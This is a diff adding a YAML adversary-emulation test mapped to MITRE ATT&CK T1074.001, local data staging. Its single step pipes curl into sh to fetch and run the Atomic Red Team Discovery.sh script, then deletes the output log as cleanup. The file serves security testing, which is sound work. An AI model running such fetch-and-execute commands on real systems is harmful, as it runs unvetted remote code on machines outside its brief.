@@ -1,0 +1,29 @@
+api_version: "2.0"
+name: Stage data from Discovery.sh
+description: |
+    Utilize curl to download discovery.sh and execute a basic information gathering shell script
+args:
+    - name: output_file
+      type: path
+      default: /tmp/T1074.001_discovery.log
+uuid: 39ce0303-ae16-4b9e-bb5b-4f53e8262066
+mitre:
+    tactics:
+        - 'TA0009: Collection'
+    techniques:
+        - 'T1074: Data Staged'
+    subtechniques:
+        - 'T1074.001: Local Data Staging'
+requirements:
+    platforms:
+        - os: linux
+        - os: macos
+steps:
+    - name: stage-data-from-discovery.sh
+      inline: |
+        curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > {{.Args.output_file}}
+      executor: sh
+      cleanup:
+        inline: |
+            rm {{.Args.output_file}}
+        executor: sh
